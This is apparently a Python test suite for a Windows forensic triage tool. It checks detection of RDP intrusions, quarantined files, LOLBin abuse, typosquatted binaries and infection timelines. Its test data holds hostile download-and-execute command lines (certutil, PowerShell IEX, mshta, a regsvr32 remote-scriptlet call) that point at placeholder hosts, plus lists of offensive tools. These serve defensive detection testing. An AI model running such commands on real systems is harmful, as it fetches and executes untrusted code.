check("O-20: rdp_inbound in SECTIONS_TO_ANALYZE", "rdp_inbound" in SECTIONS_TO_ANALYZE)
check("O-21: known_tools in SECTIONS_TO_ANALYZE", "known_tools" in SECTIONS_TO_ANALYZE)

# --- FIX-1: null バイト付き「ローカル」の除外（実測FP対策） ---
nul = ("Event[0]:\n  Date: 2024-01-01T00:00:00\n  Event ID: 21\n  Description: \n"
       "ユーザー: HOST\\u\nセッション ID: 1\nソース ネットワーク アドレス: ローカル\x00\n")
check("O-22: null付きローカル → 除外（誤HIGH防止）", parse_inbound_rdp(nul, "") == [])
nul2 = ("Event[0]:\n  Date: 2024-01-01T00:00:00\n  Event ID: 21\n  Description: \n"
        "ユーザー: HOST\\admin\x00\nセッション ID: 2\nソース ネットワーク アドレス: 203.0.113.5\x00\n")
r2 = parse_inbound_rdp(nul2, "")
check("O-23: null付き外部IPは正しく抽出", r2 and r2[0]["source_ip"] == "203.0.113.5",
      f"{r2[0]['source_ip'] if r2 else None!r}")

# --- FIX-2: known_tools 名称一致を basename 先頭アンカーに（VS誤検出対策） ---
vs = {"service": [], "tasklist": [], "directory": [], "appcompat_cache": [
    {"path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\Microsoft.VisualStudio.RemoteUtilities.dll"},
    {"path": "C:\\.moneroocean\\xmrig.exe"},
    {"path": "C:\\Tools\\anydesk.exe"},
]}
ktv = analyze_known_tools(vs)
hits = [e["identifier"] for e in ktv["entries"]]
check("O-24: VS RemoteUtilities.dll を誤検出しない", not any("RemoteUtilities" in h for h in hits), hits)
check("O-25: xmrig.exe は HIGH 検出", any("xmrig" in h and e["score"]=="HIGH" for h,e in zip(hits, ktv["entries"])))
check("O-26: anydesk.exe は検出維持", any("anydesk" in h.lower() for h in hits))

# --- FIX-4: webshell 候補から XAMPP/FW 既定を除外 ---
ws = {"service": [], "tasklist": [], "appcompat_cache": [], "directory": [
    {"path": "C:\\xampp\\htdocs\\dashboard\\phpinfo.php"},   # 既定 → 除外
    {"path": "C:\\xampp\\htdocs\\index.php"},                 # 既定 → 除外
    {"path": "C:\\xampp\\htdocs\\phpmyadmin\\index.php"},     # 既定 → 除外
    {"path": "C:\\xampp\\htdocs\\d76ea66.php"},               # 乱数名 → 検出
]}
ktw = analyze_known_tools(ws)
wsent = [e for e in ktw["entries"] if "Webシェル候補" in e["identifier"]]
check("O-27: webshell 既定除外で乱数名のみ残る（1件）",
      len(wsent) == 1 and "1件" in wsent[0]["identifier"], wsent[0]["identifier"] if wsent else "なし")

# --- FIX-3: system_7045 MpKsl は post-filter でも CLEAN（事前除外の整合確認） ---
mpchk = {"section": "system_7045", "entries": [
    {"identifier": "MpKsldeadbeef", "score": "HIGH", "reason": "x",
     "iocs": ["C:\\ProgramData\\Microsoft\\Windows Defender\\X\\MpKslDrv.sys"]},
]}
_apply_post_filter("system_7045", mpchk)
check("O-28: MpKsl post-filter CLEAN（事前除外漏れの保険）", mpchk["entries"][0]["score"] == "CLEAN")

# ═══════════════════════════════════════════════════════════════
# ケース P: AV検知ファイルの隔離SHA-1 → VTハッシュ照合（AV-VT）
# ═══════════════════════════════════════════════════════════════
section("ケース P: 隔離SHA-1 VT照合（AV-VT）")
import vt_post as _vtp

q_raw = [
    {"threat_name": "", "path": r"C:\ProgramData\Microsoft\Windows Defender\Quarantine\ResourceData\29\290EE300388BA4DABB52593A4F5567FBE6D45F70"},
    {"threat_name": "", "path": r"C:\ProgramData\Microsoft\Windows Defender\Quarantine\Resources\29\290EE300388BA4DABB52593A4F5567FBE6D45F70"},
    {"threat_name": "", "path": r"C:\ProgramData\Microsoft\Windows Defender\Quarantine\ResourceData\FB\FB86C24A7B94EC5B04912545DC509DCC7BB51D3D"},
    {"threat_name": "Adware:Win32/Tnega", "path": r"file:_C:\Users\u\AppData\Local\x\dnscfg[1].dll"},
]
qr = analyze_defender_quarantine_rule_based(q_raw)
sha_entries = [e for e in qr["entries"] if e["iocs"] and len(e["iocs"][0]) == 40]
check("P-1: 隔離パスから SHA-1 を裸ハッシュとして抽出", len(sha_entries) >= 2, f"{len(sha_entries)}件")
check("P-2: ResourceData/Resources の同一SHA-1を1件に集約",
      sum(1 for e in qr["entries"] if "290EE300388BA4DABB52593A4F5567FBE6D45F70" in e["iocs"]) == 1)
check("P-3: 抽出SHA-1の桁数=40(SHA-1)",
      all(len(e["iocs"][0]) == 40 for e in sha_entries))
check("P-4: vt_post が SHA-1 を hash 種別と判定",
      _vtp._classify_ioc("290EE300388BA4DABB52593A4F5567FBE6D45F70") == "hash")
_imap = _vtp.extract_iocs_from_analyzed({"sections": {"defender_quarantine": qr}}, min_score="MEDIUM")
check("P-5: extract_iocs が隔離SHA-1を hash として収集",
      sum(1 for v in _imap.values() if v["ioc_type"] == "hash") == 2, str(len(_imap)))
check("P-6: 脅威名ありエントリは HIGH 維持",
      any(e["score"] == "HIGH" and e["identifier"] == "Adware:Win32/Tnega" for e in qr["entries"]))

# ═══════════════════════════════════════════════════════════════
# ケース Q: 着信RDP外部IPの VT照合（RDP-VT）
# ═══════════════════════════════════════════════════════════════
section("ケース Q: 着信RDP VT照合（RDP-VT）")
_an = {"sections": {"rdp_inbound": {"entries": [
    {"identifier": "EID21 接続元=61.216.184.20", "score": "HIGH", "iocs": ["61.216.184.20"], "reason": "外部"},
    {"identifier": "EID21 接続元=192.168.1.5", "score": "LOW", "iocs": ["192.168.1.5"], "reason": "内部"},
]}}}
_qm = _vtp.extract_iocs_from_analyzed(_an, min_score="MEDIUM")
check("Q-1: 外部IPを ip として抽出", _qm.get("61.216.184.20", {}).get("ioc_type") == "ip")
check("Q-2: 内部IP/LOWは VT対象外", "192.168.1.5" not in _qm)
check("Q-3: VTクリーンでも着信RDP HIGH 維持",
      _vtp.apply_vt_score("HIGH", {"verdict": "clean", "positives": 0, "total": 90, "vt_url": ""}, "ip")[0] == "HIGH")
check("Q-4: VT検知で注記付与（HIGH維持）",
      _vtp.apply_vt_score("HIGH", {"verdict": "malicious", "positives": 9, "total": 90, "vt_names": ["X"], "vt_url": ""}, "ip")[0] == "HIGH")

# ═══════════════════════════════════════════════════════════════
# ケース R: UserAssist GUI実行痕跡（N-5）
# ═══════════════════════════════════════════════════════════════
section("ケース R: UserAssist（N-5）")
# parse_userassist: ROT13 値名 + hex（最小の合成 reg）
import codecs as _cod
_name = _cod.encode(r"{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\notepad.exe", "rot_13").replace("\\", "\\\\")
_hex = ",".join(["00"]*4 + ["05","00","00","00"] + ["00"]*60)  # run_count=5 @offset4
_reg = ('Windows Registry Editor Version 5.00\n\n'
        '[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{G}\\Count]\n'
        f'"{_name}"=hex:{_hex}\n'
        f'"{_cod.encode("UEME_CTLSESSION","rot_13")}"=hex:00,00\n')
ua = parse_userassist(_reg)
check("R-1: ROT13+KNOWNFOLDER 解決", any(e["path"] == r"C:\Windows\System32\notepad.exe" for e in ua), str(ua))
check("R-2: 制御エントリ(UEME_CTLSESSION)除外", all("CTLSESSION" not in e["path"] for e in ua))
check("R-3: run_count 抽出(=5)", any(e["run_count"] == 5 for e in ua))

# analyze_userassist_rule_based: 不審パスのみ抽出
syn = [
    {"path": r"%USERPROFILE%\Videos\endstart.bat", "run_count": 1, "last_run": "2020-06-29 09:06:22"},
    {"path": r"C:\Users\u\Downloads\setup.exe", "run_count": 1, "last_run": ""},
    {"path": r"C:\Windows\System32\notepad.exe", "run_count": 9, "last_run": ""},
    {"path": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App", "run_count": 0, "last_run": ""},
]
rua = analyze_userassist_rule_based(syn)
ids = [e["identifier"] for e in rua["entries"]]
check("R-4: Videos\\*.bat → HIGH",
      any("Videos" in i and "endstart.bat" in i for i, e in zip(ids, rua["entries"]) if e["score"] == "HIGH"), str(ids))
check("R-5: [M-4] Downloads\\setup.exe → LOW（DL実行は降格・Tempは維持）",
      any("setup.exe" in e["identifier"] and e["score"] == "LOW" for e in rua["entries"]))
check("R-5b: [M-4] Temp\\*.exe は MEDIUM 維持（高リスク配置）",
      any(("Temp" in e["identifier"]) and e["score"] == "MEDIUM" for e in rua["entries"])
      or all("Temp" not in e["identifier"] for e in rua["entries"]))
check("R-6: System32\\notepad は出力しない", not any("notepad" in i for i in ids))
check("R-7: UWPアプリは出力しない", not any("FeedbackHub" in i for i in ids))
check("R-8: userassist in SECTIONS_TO_ANALYZE", "userassist" in SECTIONS_TO_ANALYZE)

# ═══════════════════════════════════════════════════════════════
# ケース S: チャンク並列度の可変化（N-4b）
# ═══════════════════════════════════════════════════════════════
section("ケース S: チャンク並列度（N-4b）")
import analyze_section as _as
check("S-1: 既定 CHUNK_MAX_WORKERS=1（従来挙動維持）", _as.CHUNK_MAX_WORKERS == 1)
# 環境変数からの読込ロジック（max(1, int(env))）を検証
def _resolve(v):
    return max(1, int(v))
check("S-2: env=3 → 3", _resolve("3") == 3)
check("S-3: env=0/負値 → 1 に正規化", _resolve("0") == 1 and _resolve("-2") == 1)
check("S-4: call_llm_chunked が CHUNK_MAX_WORKERS を参照", "CHUNK_MAX_WORKERS" in _as.call_llm_chunked.__code__.co_names)

# ═══════════════════════════════════════════════════════════════
# ケース T: 取りこぼし対策（RAT追加 / directory truncation / 失敗可視化）
# ═══════════════════════════════════════════════════════════════
section("ケース T: 取りこぼし対策")
# T-1: ToDesk / Sunlogin / RustDesk 等の RAT を known_tools が検出
_rat = analyze_known_tools({"service": [], "tasklist": [], "appcompat_cache": [], "directory": [
    {"path": r"C:\Users\Public\Libraries\ToDesk.exe"},
    {"path": r"C:\Program Files\Sunlogin\SunloginClient.exe"},
    {"path": r"C:\Tools\rustdesk.exe"},
]})
_ratids = " ".join(e["identifier"].lower() for e in _rat["entries"])
check("T-1: ToDesk 検出", "todesk" in _ratids)
check("T-2: Sunlogin 検出", "sunlogin" in _ratids)
check("T-3: RustDesk 検出", "rustdesk" in _ratids)
# T-4: directory の truncation 対策（chunk_size 縮小・max_tokens 確保）
check("T-4: directory depth1 chunk_size<=20（truncation防止）", _as.CHUNK_SIZE_DEPTH1["directory"] <= 20)
check("T-5: directory depth1 max_tokens>=2048", _as.MAX_TOKENS["directory"][1] >= 2048)

# ═══════════════════════════════════════════════════════════════
# ケース U: directory 異常スコアリング + 上限退避（N-4c）
# ═══════════════════════════════════════════════════════════════
section("ケース U: directory 異常スコアリング（N-4c）")
from analyze_section import _dir_anomaly_score, _classify_dir_entry, DIR_MAX_LLM
def _sc(p): return _dir_anomaly_score({"path": p}, _classify_dir_entry({"path": p}))
check("U-1: 二重拡張子が最高スコア",
      _sc(r"C:\Users\Public\Libraries\invoice.pdf.exe") > _sc(r"C:\Users\Public\Libraries\ToDesk.exe"))
check("U-2: Public\\Libraries 実行体は通常ファイルより高スコア",
      _sc(r"C:\Users\Public\Libraries\x.exe") > _sc(r"C:\Users\u\Documents\report.docx"))
check("U-3: System32偽装(svchost)は加点される",
      _sc(r"C:\Windows\svchost.exe") >= 100)
check("U-4: DIR_MAX_LLM 既定=200", DIR_MAX_LLM == 200)
check("U-5: DIR_MAX_LLM env可変・下限20",
      max(20, int("5")) == 20 and max(20, int("300")) == 300)
# 上位N件カット＋退避の並べ替えロジック（関数合成で検証）
_paths = [r"C:\Users\Public\Libraries\a.pdf.exe", r"C:\Windows\svchost.exe",
          r"C:\ProgramData\u.bat", r"C:\Users\u\Documents\x.docx", r"C:\temp\y.txt"]
_ranked = sorted(_paths, key=_sc, reverse=True)
check("U-6: 異常スコア降順で二重拡張子が先頭", "a.pdf.exe" in _ranked[0])
check("U-7: 通常ドキュメントは末尾側", _ranked.index(r"C:\Users\u\Documents\x.docx") >= 3)

# ═══════════════════════════════════════════════════════════════
# ケース V: VT filepath 検索の特殊文字エラー修正
# ═══════════════════════════════════════════════════════════════
section("ケース V: VT filepath 検索の400エラー修正")
import vt_post as _vtmod
from unittest import mock as _mock

class _Resp:
    def __init__(self, code): self.status_code = code
    def json(self): return {"meta": {"count": 0}, "data": []}
    def raise_for_status(self): pass

# [1] を含むIEキャッシュ名で 400 が返る状況を模擬 → error でなく unknown に
with _mock.patch.object(_vtmod.requests, "get", return_value=_Resp(400)) as mg:
    r = _vtmod._vt_search_by_name("dnscfg[1].dll", "dummykey", None)
    # params 経由で name を二重引用符化して渡しているか
    _, kw = mg.call_args
    sent_q = kw.get("params", {}).get("query", "")
check("V-1: 400は error でなく unknown 扱い（穏当処理）", r.get("verdict") == "unknown", str(r.get("verdict")))
check("V-2: name 値を二重引用符で囲む", sent_q == 'name:"dnscfg[1].dll"', sent_q)
check("V-3: params を dict で渡す（手動URL連結でない）", isinstance(kw.get("params"), dict))
# 正常時（200・ヒット0）は unknown
with _mock.patch.object(_vtmod.requests, "get", return_value=_Resp(200)):
    r2 = _vtmod._vt_search_by_name("Zotero.dotm", "dummykey", None)
check("V-4: 200/ヒット0 は error にならない", r2.get("verdict") != "error", str(r2.get("verdict")))

# ═══════════════════════════════════════════════════════════════
# ケース W: known_tools 第1優先強化（A-HIGH ツール / C サービス配置 / Public拡大）
# ═══════════════════════════════════════════════════════════════
section("ケース W: known_tools 強化（A-HIGH / C / Public）")
# A-HIGH: 中国系/トンネル/資格情報ツール
_ah = analyze_known_tools({"service": [], "tasklist": [], "appcompat_cache": [
    {"path": r"C:\x\fscan.exe"}, {"path": r"C:\x\godzilla.exe"},
    {"path": r"C:\x\behinder.exe"}, {"path": r"C:\x\chisel.exe"},
    {"path": r"C:\x\sliver.exe"}, {"path": r"C:\x\suo5.exe"},
    {"path": r"C:\x\nxc.exe"},
], "directory": []})
_ahids = " ".join(e["identifier"].lower() for e in _ah["entries"] if e["score"] == "HIGH")
for tool in ["fscan", "godzilla", "behinder", "chisel", "sliver", "suo5", "nxc"]:
    check(f"W-A: {tool} を HIGH 検出", tool in _ahids)

# C: サービス異常配置
_cs = analyze_known_tools({"service": [
    {"name": "S1", "image_path": r"C:\Users\u\AppData\Local\evil.exe"},
    {"name": "S2", "image_path": r"C:\ProgramData\agent\svc.exe"},
    {"name": "S3", "image_path": r"C:\Temp\svchost.exe"},
    {"name": "S4", "image_path": r"C:\Program Files\Sub Dir\run.exe -k"},
    {"name": "S5", "image_path": r"C:\Windows\System32\svchost.exe -k netsvcs"},
], "tasklist": [], "appcompat_cache": [], "directory": []})
_csmap = {e["identifier"].split(":")[0]: e["score"] for e in _cs["entries"]}
def _has(sub, score):
    return any(sub in e["identifier"] and e["score"] == score for e in _cs["entries"])
check("W-C1: ユーザー領域(AppData)サービス → MEDIUM（per-user正規あり）", _has("ユーザー領域", "MEDIUM"))
check("W-C2: ProgramData サービス → MEDIUM", _has("非標準領域", "MEDIUM"))
check("W-C3: 引用符なし空白パス → MEDIUM", _has("引用符なし", "MEDIUM"))
check("W-C4: 正規System32 svchost は出力しない",
      not any("System32" in e["identifier"] and "svchost" in e["identifier"] for e in _cs["entries"]))

# Public 配下スコア拡大（Libraries 限定でない）
_pub = lambda p: _dir_anomaly_score({"path": p}, _classify_dir_entry({"path": p}))
check("W-P1: Public\\Documents\\exe も Libraries と同等スコア",
      _pub(r"C:\Users\Public\Documents\x.exe") == _pub(r"C:\Users\Public\Libraries\x.exe"))
check("W-P2: Public配下の実行体は通常exeより高スコア",
      _pub(r"C:\Users\Public\Music\a.exe") > _pub(r"C:\Apps\a.exe"))
check("W-P3: Public配下の非実行体は+40されない",
      _pub(r"C:\Users\Public\Documents\a.txt") < _pub(r"C:\Users\Public\Documents\a.exe"))

# ═══════════════════════════════════════════════════════════════
# ケース X: LOLBin悪用検出(B) / known_tools走査対象拡張(D)
# ═══════════════════════════════════════════════════════════════
section("ケース X: LOLBin悪用(B) / 走査対象拡張(D)")
_bx = analyze_known_tools({
    "service": [], "tasklist": [], "appcompat_cache": [], "directory": [],
    "ps_history": [
        r"certutil -urlcache -split -f http://evil/a.exe a.exe",
        r'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA9AD0AdGVzdA==',
        r'powershell IEX (New-Object Net.WebClient).DownloadString("http://x/y")',
        r"mshta http://evil/x.hta",
        r"wmic process call create calc.exe",
        r"Get-ChildItem C:\Users",                # 正規 → 非検出
    ],
    "persistence_reg": [{"reg_key": "Run", "entry_name": "e",
                          "path": r"regsvr32 /s /i:http://e/x.sct scrobj.dll"}],
    "startup_folder": [],
    "prefetch": [{"name": "MIMIKATZ.EXE-1A2B3C4D.pf", "created": "2024"}],
})
_ids = [e["identifier"] for e in _bx["entries"]]
_hi = " ".join(i for i, e in zip(_ids, _bx["entries"]) if e["score"] == "HIGH").lower()
check("X-B1: certutil ダウンロードを HIGH", "certutil" in _hi)
check("X-B2: powershell -enc を HIGH", "powershell" in _hi and "エンコード" in " ".join(_ids))
check("X-B3: powershell IEX DownloadString を HIGH", any("DownloadString" in i for i in _ids))
check("X-B4: mshta http を HIGH", "mshta" in _hi)
check("X-B5: regsvr32 Squiblydoo(persistence_reg) を HIGH", "squiblydoo" in _hi)
check("X-B6: wmic process call create を MEDIUM",
      any("wmic" in i.lower() and e["score"] == "MEDIUM" for i, e in zip(_ids, _bx["entries"])))
check("X-B7: 正規コマンド(Get-ChildItem)は非検出", not any("ChildItem" in i for i in _ids))
check("X-D1: prefetch名から mimikatz を HIGH 検出", "mimikatz" in _hi)

# ═══════════════════════════════════════════════════════════════
# ケース Y: ホワイトリスト/偽装判定の微修正（F）
# ═══════════════════════════════════════════════════════════════
section("ケース Y: WL/偽装微修正（F）")
# F-1: CCM 正規サービスは異常配置で検出しない / 非正規Windows配下は HIGH
_fy = analyze_known_tools({"service": [
    {"name": "CcmExec", "image_path": r"C:\Windows\CCM\CcmExec.exe"},
    {"name": "Evil", "image_path": r"C:\Windows\Help\evil.exe"},
], "tasklist": [], "appcompat_cache": [], "directory": [],
    "ps_history": [], "persistence_reg": [], "startup_folder": [], "prefetch": []})
check("Y-F1: CCM 正規サービスを異常配置検出しない",
      not any("CcmExec" in e["identifier"] for e in _fy["entries"]))
check("Y-F2: C:\\Windows\\Help の非正規サービスは検出（OEM配慮で MEDIUM）",
      any("evil.exe" in e["identifier"] and e["score"] == "MEDIUM" for e in _fy["entries"]))
# F-3: タイポスクワット
_ty = analyze_known_tools({"service": [], "tasklist": [], "appcompat_cache": [
    {"path": r"C:\Users\u\scvhost.exe"}, {"path": r"C:\Temp\svch0st.exe"},
    {"path": r"C:\Windows\System32\svchost.exe"},
], "directory": [], "ps_history": [], "persistence_reg": [], "startup_folder": [], "prefetch": []})
_tyhi = [e for e in _ty["entries"] if "タイポスクワット" in e["identifier"]]
check("Y-F3: scvhost/svch0st をタイポスクワット HIGH 検出",
      sum(1 for e in _tyhi if e["score"] == "HIGH") >= 2, str(len(_tyhi)))
check("Y-F4: 正規 svchost.exe はタイポスクワット検出しない",
      not any("System32\\svchost" in e["identifier"] for e in _tyhi))
# F-5..7: 異常スコア加点
_as2 = lambda p: _dir_anomaly_score({"path": p}, _classify_dir_entry({"path": p}))
check("Y-F5: $Recycle.Bin の実行体は加点(+40)",
      _as2(r"C:\$Recycle.Bin\S-1-5-21\y.exe") >= 80)
check("Y-F6: Startup の実行体は加点(+35)",
      _as2(r"C:\Users\u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.exe") >= 75)
check("Y-F7: AppData\\Roaming直下exeは加点だがサブフォルダ正規appは加点しない",
      _as2(r"C:\Users\u\AppData\Roaming\evil.exe") > _as2(r"C:\Users\u\AppData\Roaming\Discord\app.exe"))

# ═══════════════════════════════════════════════════════════════
# ケース Z: 実機FP修正（exec-gating / Defender Platform / fqdn拡張子）
# ═══════════════════════════════════════════════════════════════
section("ケース Z: 実機FP修正（v3.26）")
from analyze_section import _kt_is_executable
# Z-1: ツール名一致は実行体のみ（TeX gost / ToDesk log は誤検出しない）
_zk = analyze_known_tools({"service": [], "tasklist": [], "appcompat_cache": [
    {"path": r"C:\texlive\2025\doc\bibtex\gost\gost.pdf"},
    {"path": r"C:\texlive\2025\tex\latex\biblatex-gost\gost-alphabetic.bbx"},
    {"path": r"C:\ToDesk\todesk_20240101.log"},
    {"path": r"C:\Program Files (x86)\AnyViewer\AnyViewer.ico"},
    {"path": r"C:\Users\Public\gost.exe"},          # 本物→残す
    {"path": r'"C:\Users\Public\Libraries\ToDesk.exe" --runservice'},  # args付き本物→残す
], "directory": [], "ps_history": [], "persistence_reg": [], "startup_folder": [],
    "prefetch": [{"name": "MIMIKATZ.EXE-ABCD1234.pf"}]})
_zids = " ".join(e["identifier"] for e in _zk["entries"])
check("Z-1: gost.pdf/.bbx を誤検出しない", "gost.pdf" not in _zids and ".bbx" not in _zids)
check("Z-2: ToDesk log/AnyViewer.ico を誤検出しない", ".log" not in _zids and ".ico" not in _zids)
check("Z-3: gost.exe（本物）は検出", "gost.exe" in _zids)
check("Z-4: args付き ToDesk.exe（本物）は検出", "ToDesk.exe" in _zids)
check("Z-5: prefetch .pf（mimikatz）は検出", "mimikatz" in _zids.lower())
check("Z-6: _kt_is_executable: 非実行体=False / 実行体=True",
      not _kt_is_executable("gost.pdf") and _kt_is_executable("gost.exe")
      and _kt_is_executable("MIMIKATZ.EXE-ABCD1234.pf") and _kt_is_executable("fscan"))

# Z-7: Defender Platform は ProgramData サービス誤検出しない
_zd = analyze_known_tools({"service": [
    {"name": "windefend", "image_path": r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24010\MsMpEng.exe"'},
    {"name": "evil", "image_path": r"C:\ProgramData\evil\bad.exe"},
], "tasklist": [], "appcompat_cache": [], "directory": [],
    "ps_history": [], "persistence_reg": [], "startup_folder": [], "prefetch": []})
check("Z-7: Defender Platform サービスを誤検出しない",
      not any("windefend" in e["identifier"] for e in _zd["entries"]))
check("Z-8: 非Defender の ProgramData サービスは MEDIUM 維持",
      any("bad.exe" in e["identifier"] and e["score"] == "MEDIUM" for e in _zd["entries"]))

# Z-9: VT分類: ファイル拡張子を fqdn 誤分類しない
import vt_post as _vz
check("Z-9: Zotero.dotm/gost.bbx は fqdn でない",
      _vz._classify_ioc("Zotero.dotm") != "fqdn" and _vz._classify_ioc("gost.bbx") != "fqdn")
check("Z-10: 実ドメインは fqdn 維持", _vz._classify_ioc("evil.example.org") == "fqdn")

# ═══════════════════════════════════════════════════════════════
# ケース AA: 切断JSONサルベージ / C-svc重大度再設計（v3.27）
# ═══════════════════════════════════════════════════════════════
section("ケース AA: サルベージ / C-svc再設計（v3.27）")
from analyze_section import _salvage_truncated_entries
# AA-1: 切断された entries 配列から完了済みオブジェクトを救出
_trunc = ('{\n "section": "x",\n "entries": [\n'
          '  {"identifier": "C:\\\\a\\\\b.exe", "score": "LOW"},\n'
          '  {"identifier": "C:\\\\c\\\\d.exe", "score": "HIGH"},\n'
          '  {"identifier": "C:\\\\e\\\\f.exe", "sco')   # ←切断
_sv = _salvage_truncated_entries(_trunc)
check("AA-1: 切断JSONから完了済み2件を救出", len(_sv) == 2, str(len(_sv)))
check("AA-2: 救出エントリの中身が正しい",
      _sv[0].get("identifier") == r"C:\a\b.exe" and _sv[1].get("score") == "HIGH")
# AA-3: Windowsパス内の \" や \\ を含んでも壊れない
_trunc2 = ('{"entries":[{"identifier":"C:\\\\Users\\\\\\"q\\\\\\".exe","score":"LOW"},{"identifier":"x","sc')
check("AA-3: エスケープ含むパスでも救出", len(_salvage_truncated_entries(_trunc2)) == 1)
# AA-4: entries が無い/壊れている場合は空
check("AA-4: entries無しは空リスト", _salvage_truncated_entries('{"foo":1}') == [])

# AA-5..8: C-svc 重大度＋[3] allowlist（既知OEM/per-userは抑制、未知per-userはMEDIUM、高リスクはHIGH）
_rt = analyze_known_tools({"service": [
    {"name": "cx", "image_path": r'"C:\WINDOWS\CxSvc\CxMonSvc.exe"'},     # 既知OEM→抑制
    {"name": "rtk", "image_path": r"%SystemRoot%\RtkBtManServ.exe"},       # 既知OEM→抑制
    {"name": "unkn", "image_path": r"C:\Users\u\AppData\Local\Acme\x.exe"},# 未知per-user→MEDIUM
    {"name": "evil", "image_path": r"C:\Windows\Temp\bad.exe"},           # Temp→HIGH
], "tasklist": [], "appcompat_cache": [], "directory": [],
    "ps_history": [], "persistence_reg": [], "startup_folder": [], "prefetch": []})
_rthi = [e for e in _rt["entries"] if e["score"] == "HIGH"]
_rtids = " ".join(e["identifier"] for e in _rt["entries"])
check("AA-5: [3] 既知OEM(CxSvc/RtkBt)は allowlist で抑制（不検出）",
      "CxMon" not in _rtids and "RtkBt" not in _rtids)
check("AA-6: 未知 per-user(AppData)サービスは HIGH でない",
      not any("AppData" in e["identifier"] for e in _rthi))
check("AA-7: Temp領域のサービスは HIGH 維持",
      any("bad.exe" in e["identifier"] for e in _rthi))
check("AA-8: 未知 per-user は MEDIUM で検出（取りこぼさない）",
      any(e["score"] == "MEDIUM" and "Acme" in e["identifier"] for e in _rt["entries"]))

# AA-9..11: VT fqdn 分類を TLD allowlist 方式に（切り詰め拡張子の誤分類対策）
check("AA-9: 切り詰め拡張子(.ex)や未知拡張子は fqdn でない",
      _vz._classify_ioc("DiscSoftBusServiceLite.ex") != "fqdn"
      and _vz._classify_ioc("host.unknownext") != "fqdn"
      and _vz._classify_ioc("foo.exe") != "fqdn")
check("AA-10: 実TLDのドメインは fqdn 維持（マルウェア多用TLD含む）",
      _vz._classify_ioc("evil.com") == "fqdn" and _vz._classify_ioc("c2.top") == "fqdn"
      and _vz._classify_ioc("phish.tk") == "fqdn" and _vz._classify_ioc("a.b.c.ru") == "fqdn")
check("AA-11: _is_valid_tld 判定", _vz._is_valid_tld("x.com") and not _vz._is_valid_tld("x.ex"))

# ═══════════════════════════════════════════════════════════════
# ケース TL: 感染タイムライン（T-TL1/2/3）
# ═══════════════════════════════════════════════════════════════
section("ケース TL: 感染タイムライン")
import timeline as _tl
_secs = {
    "system_7045": [{"datetime": "2026-06-20 14:32:11", "service_name": "EvilSvc",
                      "image_path": r"C:\Temp\x.exe"}],
    "rdp_inbound": [{"datetime": "2026-06-20 14:25:03", "user": "admin",
                      "source_ip": "203.0.113.5", "event_id": "1149"}],
    "userassist": [{"last_run": "2026-06-20 14:28:40", "path": r"C:\Users\u\Downloads\inv.exe",
                     "run_count": "1"}],
    "security_1102": [{"datetime": "2026-06-20 15:01:00"}],
    "defender_quarantine": [{"datetime": "2026-06-20 14:40:00",
                              "threat_name": "Trojan:Win32/X", "path": r"C:\Temp\x.exe"}],
    "prefetch": [{"name": "OLD.EXE-1.pf", "modified": "2026-06-19 09:00:00"}],
}
_tlr = _tl.build_timeline(_secs, findings=[r"C:\Temp\x.exe", "203.0.113.5"])
_evs = _tlr["events"]
check("TL-1: 全セクションからイベント抽出", len(_evs) == 6, str(len(_evs)))
check("TL-2: 時系列ソート（先頭=最古 prefetch 6/19）",
      _evs[0]["ts"] == "2026-06-19 09:00:00")
check("TL-3: 末尾=最新（ログ消去 15:01）",
      _evs[-1]["ts"] == "2026-06-20 15:01:00")
check("TL-4: phase 付与（サービス→永続化, RDP→横展開/初期侵入, ログ消去→防御回避）",
      any(e["phase"] == "永続化" for e in _evs)
      and any(e["phase"] == "横展開/初期侵入" for e in _evs)
      and any(e["phase"] == "防御回避" for e in _evs))
check("TL-5: 所見突合で x.exe/IP のイベントが不審(*)",
      sum(1 for e in _evs if e["suspicious"]) == 3)
check("TL-6: 不審時間窓 14:25〜14:40",
      _tlr["suspicious_window"]["from"] == "2026-06-20 14:25:03"
      and _tlr["suspicious_window"]["to"] == "2026-06-20 14:40:00")
check("TL-7: security_1102 は HIGH 重大度",
      any(e["section"] == "security_1102" and e["severity"] == "HIGH" for e in _evs))
# 時刻パース
check("TL-8: 時刻パース正常/異常",
      _tl._parse_ts("2026-06-20 14:32:11") is not None
      and _tl._parse_ts("2026/06/20 14:32:11") is not None
      and _tl._parse_ts("不明") is None and _tl._parse_ts("") is None)
# 解析不能の件数カウント
_tlr2 = _tl.build_timeline({"system_7045": [{"datetime": "bad", "service_name": "x"}]}, [])
check("TL-9: 時刻解析不能はskipにカウントしイベント化しない",
      _tlr2["skipped"] == 1 and len(_tlr2["events"]) == 0)
# レンダリング（整形・全角整列が落ちない）
_txt = _tl.render_timeline_text(_tlr)
check("TL-10: 年表テキスト生成（見出し・不審インシデント窓・イベントを含む）",
      "感染タイムライン" in _txt and "不審インシデント窓" in _txt and "EvilSvc" in _txt)
check("TL-11: イベント無しでも md 生成が壊れない",
      "感染タイムライン" in _tl.build_timeline_markdown({}, []))

# ═══════════════════════════════════════════════════════════════
# ケース M: SECTION_LABELS の完全性
# ═══════════════════════════════════════════════════════════════section("ケース M: SECTION_LABELS / SECTION_LABELS_SHORT 完全性")

report_sections = [
    "startup_folder", "defender_quarantine",
    "persistence_reg", "task_scheduler", "service",
    "directory", "dns_cache", "netstat", "prefetch",
    "appcompat_cache", "ps_history",
    "hosts", "system_7045",
    "security_1102", "system_104",
    "rdp_1024", "bits_jobs", "task_141",
    "rdp_inbound", "known_tools", "userassist",
]
for sec in report_sections:
    check(f"M: SECTION_LABELS[{sec}]", sec in SECTION_LABELS)

for sec in ["ps_history","hosts","system_7045","security_1102","system_104",
            "persistence_reg","task_scheduler","service","directory","dns_cache",
            "netstat","prefetch","appcompat_cache","startup_folder","defender_quarantine",
            "rdp_1024","bits_jobs","task_141","rdp_inbound","known_tools","userassist"]:
    check(f"M: SECTION_LABELS_SHORT[{sec}]", sec in SECTION_LABELS_SHORT)

# ═══════════════════════════════════════════════════════════════
# ケース V: 解析中断機能（cancel_check）
# ═══════════════════════════════════════════════════════════════
